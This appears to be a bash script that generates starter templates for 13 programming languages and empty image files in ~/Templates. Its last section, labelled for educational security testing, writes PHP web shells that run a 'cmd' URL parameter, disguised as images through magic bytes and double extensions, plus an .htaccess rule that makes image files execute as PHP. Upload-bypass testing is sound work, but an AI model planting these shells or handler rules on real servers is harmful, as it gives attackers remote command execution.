#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

success() { 
    echo -e "${GREEN}[✓]${NC} :: $1" 
}

info() { 
    echo -e "${BLUE}[i]${NC} :: $1" 
}

warning() { 
    echo -e "${YELLOW}[!]${NC} :: $1" 
}

error() { 
    echo -e "${RED}[✗]${NC} :: $1" 
}

section() { 
    echo -e "${CYAN}[ $1 ]${NC}" 
}

#== Multi-language Code Templates Generator
# Description: Creates various programming language templates and security testing files
# Features:
#   # Creates templates for 13 different programming languages
#   # Generates empty image files for testing
#   # Creates security testing files with double extensions
#   # Organized directory structure in ~/Templates
#   # Color-coded output with status messages

# Function to print usage information
print_usage() {
    echo -e "${CYAN}[ Usage ]${NC}"
    echo "Usage: $0 [clean]"
    echo ""
    echo "Options:"
    echo "  clean    # Remove all generated templates"
    echo ""
    echo "Description:"
    echo "  This script creates a collection of programming language templates"
    echo "  and security testing files in ~/Templates directory"
    echo ""
    echo "Features:"
    echo "  # 13 programming language templates"
    echo "  # Empty image files for testing"
    echo "  # Security testing files"
}

# Check for help flag
if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    print_usage
    exit 0
fi

# Check for clean option
if [ "$1" = "clean" ]; then
    section "Cleaning Templates"
    if [ -d ~/Templates ]; then
        rm -rf ~/Templates
        success "All templates removed from ~/Templates"
    else
        info "Templates directory not found"
    fi
    exit 0
fi

# Main script execution
section "Creating Code and File Templates"

TEMPLATES_DIR=~/Templates
mkdir -p "$TEMPLATES_DIR"
success "Templates directory created at $TEMPLATES_DIR"

# C# Template Creation
section "Creating C# Templates"
CS_DIR="$TEMPLATES_DIR/cs_testing"
mkdir -p "$CS_DIR"

cat > "$CS_DIR/cs_testing.csproj" << 'EOF_CS_PROJ'
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
EOF_CS_PROJ

cat > "$CS_DIR/cs_testing.sln" << 'EOF_CS_SLN'
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.2.0
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Cs_testing", "Cs_testing.csproj", "{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}"
EndProject
Global
  GlobalSection(SolutionConfigurationPlatforms) = preSolution
    Debug|Any CPU = Debug|Any CPU
    Release|Any CPU = Release|Any CPU
  EndGlobalSection
  GlobalSection(ProjectConfigurationPlatforms) = postSolution
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.Build.0 = Release|Any CPU
  EndGlobalSection
  GlobalSection(SolutionProperties) = preSolution
    HideSolutionNode = FALSE
  EndGlobalSection
  GlobalSection(ExtensibilityGlobals) = postSolution
    SolutionGuid = {8E3EBE5F-5726-4511-AB60-D1BF277D58B4}
  EndGlobalSection
EndGlobal
EOF_CS_SLN

cat > "$CS_DIR/Program.cs" << 'EOF_CS_PROGRAM'
using System;
using Microsoft.Extensions.Configuration;

class Program {
  static void Main(string[] args) {
    Console.WriteLine("/* Project to test */");
    Program program = new Program();
    program.Test();
  }

  private void Test() {
    // Add C# test code here
  }
}
EOF_CS_PROGRAM

success "C# templates created in $CS_DIR"

# Basic HTML Template
section "Creating HTML Template"

cat > "$TEMPLATES_DIR/html_template.html" << 'EOF_HTML'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>HTML Template</h1>
</body>
</html>
EOF_HTML

success "HTML template created"

# Other Language Templates
section "Creating Multi-language Templates"

cat > "$TEMPLATES_DIR/php_test.php" << 'EOF_PHP'
<?php
class PHP_test {
  public static function main() {
    echo "/* PHP Project to test */";
    
    $app = new PHP_test();
    $app->test();
  }
  
  private function test() {
    // Add PHP test code here
  }
}

PHP_test::main();
?>
EOF_PHP

cat > "$TEMPLATES_DIR/javascript_test.js" << 'EOF_JS'
class JavaScript_test {
  static main() {
    console.log("/* JavaScript Project to test */");
    
    const app = new JavaScript_test();
    app.test();
  }
  
  test() {
    // Add JavaScript test code here
  }
}

JavaScript_test.main();
EOF_JS

cat > "$TEMPLATES_DIR/powershell_test.ps1" << 'EOF_PS'
class PowerShell_test {
  static [void] Main() {
    Write-Host "/* PowerShell Project to test */"
    
    $app = [PowerShell_test]::new()
    $app.Test()
  }
  
  [void] Test() {
    # Add PowerShell test code here
  }
}

PowerShell_test::Main()
EOF_PS

cat > "$TEMPLATES_DIR/go_test.go" << 'EOF_GO'
package main

import "fmt"

type Go_test struct {}

func main() {
  fmt.Println("/* Go Project to test */")
  
  app := Go_test{}
  app.Test()
}

func (g Go_test) Test() {
  // Add Go test code here
}
EOF_GO

cat > "$TEMPLATES_DIR/rust_test.rs" << 'EOF_RUST'
struct Rust_test;

impl Rust_test {
  fn main() {
    println!("/* Rust Project to test */");
    
    let app = Rust_test;
    app.test();
  }
  
  fn test(&self) {
    // Add Rust test code here
  }
}

fn main() {
  Rust_test::main();
}
EOF_RUST

cat > "$TEMPLATES_DIR/Java_test.java" << 'EOF_JAVA'
public class Java_test {
  public static void main(String[] args) {
    System.out.println("/* Java Project to test */");
    
    Java_test app = new Java_test();
    app.test();
  }
  
  private void test() {
    // Add Java test code here
  }
}
EOF_JAVA

cat > "$TEMPLATES_DIR/bash_test.sh" << 'EOF_BASH'
#!/bin/bash

main() {
  echo "/* Bash Project to test */"
  test_func
}

test_func() {
  # Add bash test code here
}

main "$@"
EOF_BASH

cat > "$TEMPLATES_DIR/py_testing.py" << 'EOF_PYTHON'
class Py_testing:
  def main():
    print('/* Python Project to test */')

    program = Py_testing()
    program.test()

  def test(self):
    # Add Python test code here
    pass

if __name__ == '__main__':
  Py_testing.main()
EOF_PYTHON

cat > "$TEMPLATES_DIR/cpp_test.cpp" << 'EOF_CPP'
#include <iostream>

class CPP_test {
public:
  static void main() {
    std::cout << "/* C++ Project to test */" << std::endl;
    
    CPP_test app;
    app.test();
  }
  
  void test() {
    // Add C++ test code here
  }
};

int main() {
  CPP_test::main();
  return 0;
}
EOF_CPP

cat > "$TEMPLATES_DIR/ruby_test.rb" << 'EOF_RUBY'
class Ruby_test
  def self.main
    puts "/* Ruby Project to test */"
    
    app = Ruby_test.new
    app.test
  end
  
  def test
    # Add Ruby test code here
  end
end

Ruby_test.main
EOF_RUBY

cat > "$TEMPLATES_DIR/typescript_test.ts" << 'EOF_TS'
class TypeScript_test {
  static main(): void {
    console.log("/* TypeScript Project to test */");
    
    const app = new TypeScript_test();
    app.test();
  }
  
  test(): void {
    // Add TypeScript test code here
  }
}

TypeScript_test.main();
EOF_TS

success "Multi-language templates created (PHP, JavaScript, PowerShell, Go, Rust, Java, Bash, Python, C++, Ruby, TypeScript)"

# ---
# Empty Image File Templates
# ---

section "Creating Empty Image Templates"

touch "$TEMPLATES_DIR/empty_image.png"
touch "$TEMPLATES_DIR/empty_image.jpg"
touch "$TEMPLATES_DIR/empty_image.gif"
touch "$TEMPLATES_DIR/empty_image.bmp"
touch "$TEMPLATES_DIR/empty_image.webp"
touch "$TEMPLATES_DIR/empty_image.tiff"
touch "$TEMPLATES_DIR/empty_image.ico"

cat > "$TEMPLATES_DIR/empty_image.svg" << 'EOF_SVG'
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="white"/>
  <text x="50%" y="50%" font-family="Arial" font-size="12" text-anchor="middle" dy=".3em">Empty SVG</text>
</svg>
EOF_SVG

success "Empty image templates created (PNG, JPG, GIF, BMP, WEBP, TIFF, ICO, SVG)"

# ---
# Double Extension Templates (Educational Testing)
# ---

section "Creating Double Extension Templates"

cat > "$TEMPLATES_DIR/test.php.png" << 'EOF_PHP_PNG'
GIF89a
<?php
// PHP-PNG: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_PNG

cat > "$TEMPLATES_DIR/test.php.jpg" << 'EOF_PHP_JPG'
ÿØÿà
<?php
// PHP-JPEG: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_JPG

cat > "$TEMPLATES_DIR/test.php.gif" << 'EOF_PHP_GIF'
GIF89a
<?php
// PHP-GIF: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_GIF

cat > "$TEMPLATES_DIR/htaccess_image_handler.htaccess" << 'EOF_HTACCESS'
AddType application/x-httpd-php .png .jpg .gif .jpeg
<FilesMatch "\.(png|jpg|gif|jpeg)$">
SetHandler application/x-httpd-php
</FilesMatch>
EOF_HTACCESS

# Set execution permissions for the Bash template
chmod +x "$TEMPLATES_DIR/bash_test.sh"

warning "Double extension templates created for security testing purposes"

# ---
# Finalization
# ---

section "Summary"

info "Total languages supported: 13"
info "Security testing templates: 4"
info "Image templates: 8"

success "All templates created successfully in $TEMPLATES_DIR"
warning "Educational use only: Security testing templates are for authorized testing only"
